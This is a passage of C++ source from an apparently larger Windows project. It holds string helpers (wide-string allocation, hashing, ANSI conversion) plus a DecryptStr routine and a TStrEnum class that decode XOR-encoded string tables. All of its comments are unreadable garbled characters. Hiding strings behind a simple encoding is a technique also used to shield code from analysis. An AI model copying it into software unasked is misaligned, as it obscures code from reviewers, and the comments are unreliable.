    DWORD Len = StrCalcLength(S);
	PCHAR Result = STR::Alloc(Len);

	PCHAR Tmp = Result;
	for (DWORD i = 0; i < Len; i++, S++)
	{
		if (*S == '\r')
			continue;

		*Tmp = *S;
		Tmp++;
	}
	*Tmp = 0;

	return Result;
}


//------------------------------------------------------------------------------
// WSTR - ������� ��� ������ � Wide ��������
//------------------------------------------------------------------------------

// �������� ������ �� ������ ������ StrLen
PWCHAR WSTR::Alloc(DWORD StrLen)
{
	if (StrLen == 0) return NULL;

	PWCHAR Str = (PWCHAR)HEAP::Alloc(StrLen*sizeof(WCHAR) + STRHEAD::HeadSize + sizeof(WCHAR));
	if (Str == NULL) return NULL;

	return (PWCHAR)STRHEAD::MakeHead((LPBYTE)Str, StrLen, StrLen, sizeof(WCHAR));
}
// ----------------------------------------------------------------------------

PWCHAR WSTR::New(PWCHAR Source, DWORD Len)
{
	// ������� ������ ������ , ����� Source.
	// Len - ���������� ���������� ��������
	//       ���� ����� 0, �� ����� ����������� ��� ������

	if (Source == NULL) return NULL;

	if (Len == 0) Len = CalcLength(Source);
	if (Len == 0) return NULL;

	PWCHAR Str = Alloc(Len);
	if (Str != NULL)
		m_memcpy(Str, Source, Len * sizeof(WCHAR));

	return Str;

}
// ----------------------------------------------------------------------------


void WSTR::Free(PWCHAR Str)
{
	// ���������� ������.
	// �����!!! ������ ������ ���� ������� � ������� ������� Alloc ��� New
	if (STRHEAD::CheckSignature(Str))
		HEAP::Free((LPBYTE)Str - STRHEAD::HeadSize);
}

// ----------------------------------------------------------------------------

DWORD WSTR::CalcLength(PWCHAR Str)
{
	// ������� ����������� ����� ������
	if (Str == NULL) return 0;

	/* TODO :
	����������� ���������� ����� �������� ��������� ������� ����� ������ PWCHAR*/

    DWORD Len = 0;
	for (PWCHAR Tmp = Str; *Tmp != 0; Tmp++) Len++;

	return Len;
}
// ----------------------------------------------------------------------------

bool WSTR::IsEmpty(PWCHAR Str)
{
	// ������� ���������� ������ ���� ������ ������
	return Str == NULL || *Str == 0;
}

// ----------------------------------------------------------------------------


PCHAR WSTR::ToAnsi(LPCWSTR Str, DWORD Len)
{
	// ������� ��������������� WideString � ANSI String
	if (IsEmpty((PWCHAR)Str)) return NULL;

	if (Len == 0) Len = WSTR::CalcLength((PWCHAR)Str);
	if (Len == 0) return NULL;

	// ��������������� ������
	PCHAR Result = STR::Alloc(Len);
	if (Result != NULL)
		pWideCharToMultiByte(1251, 0, Str, Len, Result, Len, NULL, NULL);

	return Result;
}

// ----------------------------------------------------------------------------
PWCHAR WSTR::End(PWCHAR Str)
{
	// ���������� ��������� �� ����� ������
	if (Str != NULL)
		for (; *Str != 0; Str++);
    return Str;
}

// ----------------------------------------------------------------------------

PWCHAR WSTR::ScanEnd(PWCHAR Str, WCHAR C)
{
	// ������� ���������� ��������� �� ��������� ������ �
	if (Str == NULL) return NULL;

	PWCHAR Res = NULL;

	for (PWCHAR Tmp = Str; *Tmp != 0; Tmp++)
		if (*Tmp == C) Res = Tmp;

	return Res;
}


DWORD WSTR::GetHash(const PWCHAR Str, DWORD Len, bool LowerCase)
{
    return UnicodeStr::Hash(Str, Len, LowerCase);
}
/*
{
	// ������� ����������� ��� ������
	// Str - �������� ������
	// Len - ����� ������, ���� ����� 0, �� ������������� �� ��������� ����
	// LowerCase - ��������� ������� � ������ ������� ����� ��������� ����

	if (Str == NULL) return (DWORD)-1; // �������� �����

	DWORD Hash = 0;
	PWCHAR Tmp = Str;

	for (DWORD i = 0; *Tmp != 0 && (Len == 0 || i < Len); Tmp++, i++)
	{
		WCHAR Ch = *Tmp;
		if (LowerCase) LowerChar(Ch);
		Hash = (( Hash << 7 ) & (DWORD)( -1 ) ) | ( Hash >> ( 32 - 7 ));
		Hash = Hash ^ Ch;
	}

	return Hash;

}
*/



// ������� ����������� ������������ ������ � �����������
string UnicodeToAnsi(const wchar_t *Str, DWORD Len)
{
	string Result;

	if (!Len) Len = STRW::Length(Str);

	if (Len)
	{
		// ��������������� ������
		Result.SetLength(Len);
		pWideCharToMultiByte(1251, 0, Str, Len, Result.t_str(), Len, NULL, NULL);
    }

	return Result;
}





//----------------------------------------------------------
//  DecryptStr - ������� �������/�������������� ������
//            ��������� ���������� �������� XOR ����������
//----------------------------------------------------------
PCHAR WINAPI DecryptStr(PCHAR String, PCHAR OutString)
{
	if (!String) return NULL;
	PCHAR Res = (OutString) ? OutString : String;
	for (PCHAR Tmp = Res; *Tmp; Tmp++)
	{
		*Tmp -= 16;
		*Tmp ^= 5;
		*Tmp += 16;
	}
	return Res;
}

//****************************************************************************
//                              TStrEnum
//****************************************************************************

TStrEnum::TStrEnum(const char *Buffer, bool Encrypted, DWORD EmptyBufHash)
{
	Initialize(Buffer, Encrypted, EmptyBufHash);
}


TStrEnum::TStrEnum(const char *Buffer)
{
	Initialize(Buffer, false, 0);
}


void TStrEnum::Initialize(const char *Buffer, bool Encrypted, DWORD EmptyBufHash)
{
	FBuf = (PCHAR)Buffer;

	if (AnsiStr::IsEmpty(FBuf) || (EmptyBufHash &&  AnsiStr::Hash(FBuf) == EmptyBufHash))
		FBuf = NULL;

	FEncrypted = Encrypted;
	FCurrent   = NULL;
}


bool TStrEnum::Next()
{
	// ������� �������� ��������� ������
	if (FBuf)
	{
        // �������� ��������� ������
		if (FCurrent)
		{
			FCurrent = AnsiStr::End(FCurrent);
			FCurrent++;
		}
		else
			FCurrent = FBuf;

		FLine = FCurrent;

        // �������������� ������
		if (!FLine.IsEmpty() && FEncrypted)
        	DecryptStr(FLine.t_str(), FLine.t_str());
	}

	return FCurrent && *FCurrent;
}


bool TStrEnum::IsEmpty()
{
	return AnsiStr::IsEmpty(FBuf);
}

